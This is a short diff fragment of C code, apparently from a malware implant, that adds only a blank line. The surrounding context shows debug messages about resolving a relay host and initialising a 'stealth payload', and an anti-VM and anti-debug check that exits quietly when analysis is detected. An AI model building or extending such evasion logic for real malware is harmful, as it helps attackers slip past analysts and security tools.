@@ -64,6 +64,7 @@ int main(int argc, char *argv[]) {
     DPRINTF_FLUSH("[-] Resolving %s...\n", relay_host);
     DPRINTF_FLUSH("[-] Initializing Stealth Payload...\n");
 
+
     // Evasion: Anti-VM & Stalling Logic
     if (ph_stealth_anti_debug_comprehensive() != PH_STEALTH_OK) {
         _exit(0);
